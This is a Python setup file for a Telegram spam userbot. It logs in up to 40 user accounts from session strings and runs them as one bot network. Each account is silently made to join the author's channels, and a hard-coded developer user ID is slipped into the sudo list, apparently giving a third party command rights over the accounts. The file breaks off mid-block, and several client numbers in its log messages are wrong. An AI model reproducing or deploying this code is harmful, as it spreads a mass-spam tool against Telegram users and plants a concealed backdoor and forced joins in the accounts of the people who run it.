#  - Spam GANGSTERSs
# Copyright © 2021 @AGORA_SPAM_OFFICIAL

import os
import sys
import random
import asyncio
import telethon.utils
from telethon.tl import functions
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from decouple import config
from os import getenv
import logging
import time
from telethon.tl.functions.messages import ImportChatInviteRequest


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

AGORAversion = "v2.0.1"

#values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default=".")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
STRING = config("STRING", default=None)
STRING2 = config("STRING2", default=None)
STRING3 = config("STRING3", default=None)
STRING4 = config("STRING4", default=None)
STRING5 = config("STRING5", default=None)
STRING6 = config("STRING6", default=None)
STRING7 = config("STRING7", default=None)
STRING8 = config("STRING8", default=None)
STRING9 = config("STRING9", default=None)
STRING10 = config("STRING10", default=None)
STRING11 = config("STRING11", default=None)
STRING12 = config("STRING12", default=None)
STRING13 = config("STRING13", default=None)
STRING14 = config("STRING14", default=None)
STRING15 = config("STRING15", default=None)
STRING16 = config("STRING16", default=None)
STRING17 = config("STRING17", default=None)
STRING18 = config("STRING18", default=None)
STRING19 = config("STRING19", default=None)
STRING20 = config("STRING20", default=None)
STRING21 = config("STRING21", default=None)
STRING22 = config("STRING22", default=None)
STRING23 = config("STRING23", default=None)
STRING24 = config("STRING24", default=None)
STRING25 = config("STRING25", default=None)
STRING26 = config("STRING26", default=None)
STRING27 = config("STRING27", default=None)
STRING28 = config("STRING28", default=None)
STRING29 = config("STRING29", default=None)
STRING30 = config("STRING30", default=None)
STRING31 = config("STRING31", default=None)
STRING32 = config("STRING32", default=None)
STRING33 = config("STRING33", default=None)
STRING34 = config("STRING34", default=None)
STRING35 = config("STRING35", default=None)
STRING36 = config("STRING36", default=None)
STRING37 = config("STRING37", default=None)
STRING38 = config("STRING38", default=None)
STRING39 = config("STRING39", default=None)
STRING40 = config("STRING40", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 1517994352 not in SUDO_USERS:
    SUDO_USERS.append(1517994352)
OWNER_ID = int(os.environ.get("OWNER_ID", None))

# Don't Mess with Codes !! 
DEV = list(map(int, getenv("FULLSUDO").split()))
DB_URI = config("DATABASE_URL", None)
DEV.append(OWNER_ID)
SUDO_USERS.append(OWNER_ID)

# Sessions
async def AGORASPAM():
    global AGORA
    global AGORA2
    global AGORA3
    global AGORA5
    global AGORA4
    global AGORA6
    global AGORA7
    global AGORA8
    global AGORA9
    global AGORA10
    global AGORA11
    global AGORA12
    global AGORA13
    global AGORA14
    global AGORA15
    global AGORA16
    global AGORA17
    global AGORA18
    global AGORA19
    global AGORA20
    global AGORA21
    global AGORA22
    global AGORA23
    global AGORA25
    global AGORA24
    global AGORA26
    global AGORA27
    global AGORA28
    global AGORA29
    global AGORA30
    global AGORA31
    global AGORA32
    global AGORA33
    global AGORA34
    global AGORA35
    global AGORA36
    global AGORA37
    global AGORA38
    global AGORA39
    global AGORA40
    
    if STRING:
        session_name = str(STRING)
        print("String 1 Found")
        AGORA = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 1")
            await AGORA.start()
            botme = await AGORA.get_me()
            await AGORA(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            AGORA = "STRING"
            print(e)
            pass
    else:
        print("Session 1 not Found")
        session_name = ""
        AGORA = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA.start()
        except Exception as e:
            pass
   
    if STRING2:
        session_name = str(STRING2)
        print("String 2 Found")
        AGORA2 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 2")
            await AGORA2.start()
            await AGORA2(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA2(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA2(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA2.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 2 not Found")
        pass
        session_name = ""
        AGORA2 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA2.start()
        except Exception as e:
            pass

    if STRING3:
        session_name = str(STRING3)
        print("String 3 Found")
        AGORA3 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 3")
            await  AGORA3.start()
            await AGORA3(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA3(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA3(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA3.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 3 not Found")
        pass
        session_name = ""
        AGORA3 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA3.start()
        except Exception as e:
            pass

    if STRING4:
        session_name = str(STRING4)
        print("String 4 Found")
        AGORA4 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 4")
            await AGORA4.start()
            await AGORA4(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA4(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA4(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA4.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 4 not Found")
        pass
        session_name = ""
        AGORA4 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA4.start()
        except Exception as e:
            pass

    if STRING5:
        session_name = str(STRING5)
        print("String 5 Found")
        AGORA5 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 5")
            await AGORA5.start()
            await AGORA5(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA5(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA5(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA5.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 5 not Found")
        pass
        session_name = ""
        AGORA5 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA5.start()
        except Exception as e:
            pass
                  
    if STRING6:
        session_name = str(STRING6)
        print("String 6 Found")
        AGORA6 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 6")
            await AGORA6.start()
            await AGORA6(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA6(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA6(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA6.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 6 not Found")
        pass
        session_name = ""
        AGORA6 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA6.start()
        except Exception as e:
            pass

    if STRING7:
        session_name = str(STRING7)
        print("String 7 Found")
        AGORA7 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 7")
            await AGORA7.start()
            await AGORA7(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA7(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA7(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA7.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 7 not Found")
        pass
        session_name = ""
        AGORA7 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA7.start()
        except Exception as e:
            pass    
        
    
    if STRING8:
        session_name = str(STRING8)
        print("String 8 Found")
        AGORA8 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 8")
            await AGORA8.start()
            await AGORA8(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA8(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA8(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA8.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 8 not Found")
        pass
        session_name = ""
        AGORA8 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA8.start()
        except Exception as e:
            pass   
        
    if STRING9:
        session_name = str(STRING9)
        print("String 9 Found")
        AGORA9 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 9")
            await AGORA9.start()
            await AGORA9(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA9(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA9(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA9.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 9 not Found")
        pass
        session_name = ""
        AGORA9 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA9.start()
        except Exception as e:
            pass   
    
  
    if STRING10:
        session_name = str(STRING10)
        print("String 10 Found")
        AGORA10 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 10")
            await AGORA10.start()
            await AGORA10(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA10(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA10(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA10.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 10 not Found")
        pass
        session_name = ""
        AGORA10 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA10.start()
        except Exception as e:
            pass 
        
    
    if STRING11:
        session_name = str(STRING11)
        print("String 11 Found")
        AGORA11 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 11")
            await AGORA11.start()
            await AGORA11(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA11(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA11(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA11.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 11 not Found")
        pass
        session_name = ""
        AGORA11 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA11.start()
        except Exception as e:
            pass
        
    
    if STRING12:
        session_name = str(STRING12)
        print("String 12 Found")
        AGORA12 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 12")
            await AGORA12.start()
            await AGORA12(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA12(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA12(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA12.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 12 not Found")
        pass
        session_name = ""
        AGORA12 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA12.start()
        except Exception as e:
            pass   
    
  
    if STRING13:
        session_name = str(STRING13)
        print("String 13  Found")
        AGORA13 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 13")
            await AGORA13.start()
            await AGORA13(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA13(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA13(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA13.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 13 not Found")
        pass
        session_name = ""
        AGORA13 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA13.start()
        except Exception as e:
            pass 
        
    
    if STRING14:
        session_name = str(STRING14)
        print("String 14 Found")
        AGORA14 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 14")
            await AGORA14.start()
            await AGORA14(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA14(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA14(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA14.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 14 not Found")
        pass
        session_name = ""
        AGORA14 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA14.start()
        except Exception as e:
            pass
        
    
    if STRING15:
        session_name = str(STRING15)
        print("String 15 Found")
        AGORA15 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 15")
            await AGORA15.start()
            await AGORA15(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA15(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA15(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA15.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 15 not Found")
        pass
        session_name = "AGORASPAM"
        AGORA15 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA15.start()
        except Exception as e:
            pass


    if STRING16:
        session_name = str(STRING16)
        print("String 16 Found")
        AGORA16 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 16")
            await AGORA16.start()
            botme = await AGORA16.get_me()
            await AGORA16(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA16(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA16(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 16 not Found")
        session_name = ""
        AGORA16 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA16.start()
        except Exception as e:
            pass
   
    if STRING17:
        session_name = str(STRING17)
        print("String 17 Found")
        AGORA17 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 17")
            await AGORA17.start()
            botme = await AGORA17.get_me()
            await AGORA17(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA17(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA17(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 17 not Found")
        session_name = ""
        AGORA17 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA17.start()
        except Exception as e:
            pass
   
    if STRING18:
        session_name = str(STRING18)
        print("String 18 Found")
        AGORA18 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 18")
            await AGORA18.start()
            botme = await AGORA18.get_me()
            await AGORA18(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA18(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA18(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 18 not Found")
        session_name = ""
        AGORA18 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA18.start()
        except Exception as e:
            pass
   
    if STRING19:
        session_name = str(STRING19)
        print("String 19 Found")
        AGORA19 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 19")
            await AGORA19.start()
            botme = await AGORA19.get_me()
            await AGORA19(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA19(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA19(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 19 not Found")
        session_name = ""
        AGORA19 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA.start()
        except Exception as e:
            pass
   
    if STRING20:
        session_name = str(STRING20)
        print("String 20 Found")
        AGORA20 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 20")
            await AGORA20.start()
            botme = await AGORA20.get_me()
            await AGORA20(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA20(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA20(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 20 not Found")
        session_name = ""
        AGORA20 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA20.start()
        except Exception as e:
            pass

    if STRING21:
        session_name = str(STRING21)
        print("String 21 Found")
        AGORA21 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 21")
            await AGORA21.start()
            botme = await AGORA21.get_me()
            await AGORA21(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA21(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA21(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 31 not Found")
        session_name = ""
        AGORA21 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA21.start()
        except Exception as e:
            pass
   
    if STRING22:
        session_name = str(STRING22)
        print("String 22 Found")
        AGORA22 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 32")
            await AGORA22.start()
            await AGORA22(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA22(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA22(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA22.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 22 not Found")
        pass
        session_name = ""
        AGORA22 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA22.start()
        except Exception as e:
            pass

    if STRING23:
        session_name = str(STRING23)
        print("String 23 Found")
        AGORA23 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 23")
            await  AGORA23.start()
            await AGORA23(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA23(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA23(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA23.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 23 not Found")
        pass
        session_name = ""
        AGORA23 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA23.start()
        except Exception as e:
            pass

    if STRING24:
        session_name = str(STRING24)
        print("String 24 Found")
        AGORA24 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 24")
            await AGORA24.start()
            await AGORA24(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA24(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA24(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA24.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 24 not Found")
        pass
        session_name = ""
        AGORA24 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA24.start()
        except Exception as e:
            pass

    if STRING25:
        session_name = str(STRING25)
        print("String 25 Found")
        AGORA25 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 35")
            await AGORA25.start()
            await AGORA25(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA25(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA25(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA25.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 25 not Found")
        pass
        session_name = ""
        AGORA25 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA25.start()
        except Exception as e:
            pass
                  
    if STRING26:
        session_name = str(STRING26)
        print("String 36 Found")
        AGORA26 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 26")
            await AGORA26.start()
            await AGORA26(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA26(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA26(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA26.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 26 not Found")
        pass
        session_name = ""
        AGORA26 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA26.start()
        except Exception as e:
            pass

    if STRING27:
        session_name = str(STRING27)
        print("String 27 Found")
        AGORA27 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 27")
            await AGORA27.start()
            await AGORA27(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA27(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA27(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA27.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 27 not Found")
        pass
        session_name = ""
        AGORA27 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA27.start()
        except Exception as e:
            pass    
        
    
    if STRING28:
        session_name = str(STRING28)
        print("String 28 Found")
        AGORA28 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 18")
            await AGORA28.start()
            await AGORA28(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA28(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA28(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA28.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 28 not Found")
        pass
        session_name = ""
        AGORA28 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA28.start()
        except Exception as e:
            pass   
        
    if STRING29:
        session_name = str(STRING29)
        print("String 29 Found")
        AGORA29 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 29")
            await AGORA29.start()
            await AGORA29(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA29(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA29(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA29.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 29 not Found")
        pass
        session_name = ""
        AGORA29 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA29.start()
        except Exception as e:
            pass   
    
  
    if STRING30:
        session_name = str(STRING30)
        print("String 30 Found")
        AGORA30 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 30")
            await AGORA30.start()
            await AGORA30(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA30(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA30(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA30.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 30 not Found")
        pass
        session_name = ""
        AGORA30 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA30.start()
        except Exception as e:
            pass 
        
    
    if STRING31:
        session_name = str(STRING31)
        print("String 31 Found")
        AGORA31 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 31")
            await AGORA31.start()
            await AGORA31(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA31(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA31(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA31.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 31 not Found")
        pass
        session_name = ""
        AGORA31 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA31.start()
        except Exception as e:
            pass
        
    
    if STRING32:
        session_name = str(STRING32)
        print("String 32 Found")
        AGORA32 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 32")
            await AGORA32.start()
            await AGORA32(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA32(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA32(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA32.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 32 not Found")
        pass
        session_name = ""
        AGORA32 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA32.start()
        except Exception as e:
            pass   
    
  
    if STRING33:
        session_name = str(STRING33)
        print("String 33  Found")
        AGORA33 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 33")
            await AGORA33.start()
            await AGORA33(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA33(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA33(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA33.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 33 not Found")
        pass
        session_name = ""
        AGORA33 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA33.start()
        except Exception as e:
            pass 
        
    
    if STRING34:
        session_name = str(STRING34)
        print("String 34 Found")
        AGORA34 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 34")
            await AGORA34.start()
            await AGORA34(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA34(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA34(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA34.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 34 not Found")
        pass
        session_name = ""
